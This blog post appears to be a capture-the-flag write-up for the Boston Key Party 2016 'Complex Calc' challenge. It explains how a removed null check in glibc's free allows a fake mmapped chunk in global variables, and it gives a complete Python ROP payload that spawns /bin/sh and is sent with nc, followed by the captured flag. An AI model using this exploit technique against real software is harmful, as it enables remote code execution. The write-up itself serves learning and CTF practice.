---
layout: post
title: "Boston Key Party - Complex Calc (pwn 5 pts)"
date: 2016-03-07 14:00
categories: ctf exploit
---

Now that the Simple Calc is done, let's try the complex one!

#Basic information

From the organizers:
{% highlight text %}
we've fixed a tiny bug!
https://s3.amazonaws.com/bostonkeyparty/2016/d60001db1a24eca410c5d102410c3311d34d832c
simplecalc.bostonkey.party 5500
{% endhighlight %}

The file has exactly the same attributes as the Simple Calc:

{% highlight shell-session %}
$ mv b28b103ea5f1171553554f0127696a18c6d2dcf7 simple_calc
$ file simple_calc
simple_calc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux),
statically linked, for GNU/Linux 2.6.24,
BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped

$ checksec --file simple_calc
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No canary found   NX enabled    No PIE          
RPATH      RUNPATH      FILE
No RPATH   No RUNPATH   simple_calc
{% endhighlight %}

# The difference

They are different in just a few bytes:
{% highlight shell-session %}
$ radiff2 complex_calc simple_calc
0x000156e0 0f1f00660f1f44 => 4885ff0f84af00 0x000156e0
{% endhighlight %}

Let's have a look at `0x000156e0 + 0x00400000 = 0x004156e0`:
{% highlight ca65 %}
| 0x004156e0      0f1f00         nop dword [rax]
| 0x004156e3      660f1f440000   nop word [rax + rax]
{% endhighlight %}

The code is located in the `free` function. These two NOPs have replaced a test
in the original binary:
{% highlight ca65 %}
| 0x004156e0      4885ff         test rdi, rdi
| 0x004156e3      0f84af000000   je 0x415798
{% endhighlight %}

The code tests if `rdi` is equal to zero. That register holds the first and
only argument passed, which is the argument passed to `free`: the pointer to
free.

If we try to execute the same payload that grilled the simple calculator, `free`
will end up dereferencing a memory area area that is not allocated and
segfault:
{% highlight ca65 %}
| 0x004156e9      488b47f8       mov rax, qword [rdi - 8]
{% endhighlight %}

The ROP chain used in the Simple Calculator should work on that binary too
because the gadgets are the same and they are located at the same addresses. We
just need to find a way to trick `free` into believing that the address we give
him is a valid chunk. For that we need a memory region that is not affected by
ASLR and that we can control.

# Memory region of interest

Each operation done by the calculator saves both operands and the result in global
variables. For example for the subtraction:
{% highlight ca65 %}
gdb-peda$ disas subs
Dump of assembler code for function subs:
[snip]
   0x000000000040114a <+19>:	mov    esi,0x6c4ab0
   0x000000000040114f <+24>:	mov    edi,0x494214
   0x0000000000401154 <+29>:	mov    eax,0x0
   0x0000000000401159 <+34>:	call   0x4084c0 <__isoc99_scanf>
[snip]
   0x0000000000401177 <+64>:	mov    esi,0x6c4ab4
   0x000000000040117c <+69>:	mov    edi,0x494214
   0x0000000000401181 <+74>:	mov    eax,0x0
   0x0000000000401186 <+79>:	call   0x4084c0 <__isoc99_scanf>
[snip]
   0x00000000004011bf <+136>:	mov    edx,DWORD PTR [rip+0x2c38eb]        # 0x6c4ab0 <sub>
   0x00000000004011c5 <+142>:	mov    eax,DWORD PTR [rip+0x2c38e9]        # 0x6c4ab4 <sub+4>
   0x00000000004011cb <+148>:	sub    edx,eax
   0x00000000004011cd <+150>:	mov    eax,edx
   0x00000000004011cf <+152>:	mov    DWORD PTR [rip+0x2c38e3],eax        # 0x6c4ab8 <sub+8>
   0x00000000004011d5 <+158>:	mov    eax,DWORD PTR [rip+0x2c38dd]        # 0x6c4ab8 <sub+8>
   0x00000000004011db <+164>:	mov    esi,eax
   0x00000000004011dd <+166>:	mov    edi,0x49428e
   0x00000000004011e2 <+171>:	mov    eax,0x0
   0x00000000004011e7 <+176>:	call   0x408390 <printf>
   0x00000000004011ec <+181>:	pop    rbp
   0x00000000004011ed <+182>:	ret    
End of assembler dump.
{% endhighlight %}

* `0x6c4ab0` holds the first operand, say `sub_x`
* `0x6c4ab4` holds the second operand, say `sub_y`
* `0x6c4ab8` holds the result of the subtraction, say `sub_r`

They all holds 32-bit values as explained in the Simple Calc write-up which
mean that we have a controllable area of 12 bytes. We could have more with the
adjacent areas used for the other operation but we don't need them.

# Analyzing `free`

That `free` is part of the [GNU C library (glibc)][glibc] which means that we
don't have to reverse it because the source code is [available][free]. The
patch that has been applied just removes the code on lines 2939 and 2940:
{% highlight c %}
 if (mem == 0)                              /* free(0) has no effect */
   return;
{% endhighlight %}

The function returns if the test in the following `if` is true:
{% highlight c%}
  p = mem2chunk (mem);

  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      /* see if the dynamic brk/mmap threshold needs adjusting */
      if (!mp_.no_dyn_threshold
          && p->size > mp_.mmap_threshold
          && p->size <= DEFAULT_MMAP_THRESHOLD_MAX)
        {
          mp_.mmap_threshold = chunksize (p);
          mp_.trim_threshold = 2 * mp_.mmap_threshold;
          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
                      mp_.mmap_threshold, mp_.trim_threshold);
        }
      munmap_chunk (p);
      return;
    }
{% endhighlight %}

`mem2chunk` takes a pointer to a memory area and returns the pointer to the
start of the chunk (i.e its header).

`chunk_is_mapped` is a macro that only checks if the second bit in the size
header of the chunk is set:
{% highlight c %}
/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */
#define IS_MMAPPED 0x2

/* check for mmap()'ed chunk */
#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)
{% endhighlight %}

The second `if` is not that important, let's skip over to the call to
`munmap_chunk` and have a look at that function:
{% highlight c %}
static void
internal_function
munmap_chunk (mchunkptr p)
{
  INTERNAL_SIZE_T size = chunksize (p);

  assert (chunk_is_mmapped (p));

  uintptr_t block = (uintptr_t) p - p->prev_size;
  size_t total_size = p->prev_size + size;
  /* Unfortunately we have to do the compilers job by hand here.  Normally
     we would test BLOCK and TOTAL-SIZE separately for compliance with the
     page size.  But gcc does not recognize the optimization possibility
     (in the moment at least) so we combine the two values into one before
     the bit test.  */
  if (__builtin_expect (((block | total_size) & (GLRO (dl_pagesize) - 1)) != 0, 0))
    {
      malloc_printerr (check_action, "munmap_chunk(): invalid pointer",
                       chunk2mem (p), NULL);
      return;
    }

  atomic_decrement (&mp_.n_mmaps);
  atomic_add (&mp_.mmapped_mem, -total_size);

  /* If munmap failed the process virtual memory address space is in a
     bad shape.  Just leave the block hanging around, the process will
     terminate shortly anyway since not much can be done.  */
  __munmap ((char *) block, total_size);
}
{% endhighlight %}

The macro `chunksize` removes the low bits from the `size`field in the chunk
headers. Therefore the second bit that has to be set, will not be present in
the variable `size` in the above code.

The only way to hit the return, is to pass that `if` statement:
{% highlight c %}
if (__builtin_expect (((block | total_size) & (GLRO (dl_pagesize) - 1)) != 0, 0))
{% endhighlight %}

Therefore `block` bitwise OR'ed with `total_size` must have all its lowest
significant bit not set (i.e. equal to zero), which means that none of `block`
and `total_size` can have there lower bits set.

* `dl_pagesize = 0x1000` 4k pages

* `block = p - p->prev_size` the address of the header of the chunk minus the
  size of the previous chunk
* `total_size = p->prev_size + size` the size of the previous chunk plus the
  size of the chunk

This gives us: `((p - p->prev_size) | (p->prev_size + size)) & 0xfff == 0`

# Creating a fake chunk

We can only control 12 bytes in the memory area of interest with the subtract
operation, but this is not a problem because in the above condition, none of
the higher bits are checked. We will layout the memory as follow:
{% highlight text %}
         +---------------+
0x6c4ab0 | sub_x | sub_y | <= prev_size
          +---------------+
0x6c4ab8 | sub_r |  ???  | <= size
         +---------------+
0x6c4ac0 |      ???      |
{% endhighlight %}


If we use the above addresses in the condition that we have to pass, we have:

* `block = p - p->prev_size = 0x6c4ab0 - p->prev_size`: `block` must end with
  `0x000` therefore `prev_size` ends with `0xab0`
* `total_size = p->prev_size + size`: `total_size` must end with `0x000`
  therefore `size` must end with `0x1000 - 0xab0 = 0x550`

There is is problem here because the second bit of `size` would not be set and
we would not enter the first `if` we mentioned at the beginning of this
section. We can add it without any problem because, as mentioned above, the
macro `chunksize`will remove it, which gives us the following values for the
operation:

* `sub_r = 0x552` = 1362
* `sub_x = 0xab0` = 2736
* `sub_y = sub_x - sub_r` = 1374

The pointer to pass to `free` is the address of the memory region as given by a
call to `malloc`, not the address of the chunk that we used lately. The correct
address is `0x6c4ac0` because the fields `size` and
`prev_size` are located respectively 8 bytes and 16 bytes before it as shown at
the beginning of the `free` function:
{% highlight ca65 %}
| 0x004156e9      488b47f8       mov rax, qword [rdi - 8]    ; size
| 0x004156ed      488d77f0       lea rsi, qword [rdi - 0x10] ; prev_size
{% endhighlight %}

# Final payload

Compared to the payload of the Simple Calc, we have to modify the 18 dwords of
padding with the address corresponding to the fake chunk we will create and add
a last operation before triggering the buffer overflow with the option 5:
{% highlight python %}
#!/usr/bin/env python3

from time import sleep
from sys import stdout

payload = []

number = '40\n'
payload.append(number)

# add padding corresponding to the fake chunk address
# note: 18 dwords have to be filled, but the address is a qword therefore we
# have to loop half as much as before
for i in range(0,9):
    payload.append('1\n3548512\n3548512\n')
    payload.append('2\n42\n42\n')           # PADD

# 0x44db34 : pop rax ; ret
payload.append('1\n2256282\n2256282\n') #ADD 2256282 2256282
payload.append('2\n42\n42\n')           # PADD
# 0x3b
payload.append('2\n101\n42\n')          #SUB 101 42
payload.append('2\n42\n42\n')           # PADD
# 0x401c87 : pop rsi ; ret
payload.append('1\n2100803\n2100804\n') #ADD 2100803 2100804
payload.append('2\n42\n42\n')           # PADD
# 0x0
payload.append('2\n42\n42\n')           #SUB 42 42
payload.append('2\n42\n42\n')           # PADD
# 0x437a85 : pop rdx ; ret
payload.append('1\n2211138\n2211139\n') #ADD 2211138 2211139
payload.append('2\n42\n42\n')           # PADD
# 0x0
payload.append('2\n42\n42\n')           #SUB 42 42
payload.append('2\n42\n42\n')           # PADD
# 0x400493 : pop r12 ; ret
payload.append('1\n2097737\n2097738\n') #ADD 2097737 2097738
payload.append('2\n42\n42\n')           # PADD
# 0x4648e5 : syscall ; ret
payload.append('1\n2303090\n2303091\n') #ADD 2303090 2303091
payload.append('2\n42\n42\n')           # PADD
# 0x492468 : mov rdi, rsp ; call r12
payload.append('1\n2396724\n2396724\n') #ADD 2396724 2396724
payload.append('2\n42\n42\n')           # PADD
# /bin/sh\0 => nib/ \0hs/
payload.append('1\n926200087\n926200088\n') #ADD 397489335 397489335
payload.append('1\n3422615\n3422616\n') #ADD 398046208 398046208

# create the fake chunk
payload.append('2\n2736\n1374\n') # store 0 in 0x6c4ab8

trigger = '5\n'
payload.append(trigger)

for cmd in payload:
    stdout.write(cmd)
    stdout.flush()
    sleep(0.1) # just to be nice
{% endhighlight %}

And *voilà*:
{% highlight shell-session %}
$ (./payload.py; cat -) | nc simplecalc.bostonkey.party 5500
[snip]
=> Integer x: Integer y: Result for x - y is 1362.

Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> ls
key
run.sh
simpleCalc_v2
socat_1.7.2.3-1_amd64.deb
cat key
BKPCTF{th3 l4st 1 2 3z}
{% endhighlight %}

[We have grilled `free`!!!!!!1!!1!1][tenways]

[glibc]: https://www.gnu.org/software/libc/
[free]: https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=b8a43bfb32bcd97a6ed468cb7635b4bbfef2e3a2;hb=HEAD#l2925
[tenways]: http://lifehacker.com/top-10-ways-to-hack-your-grill-1607315381
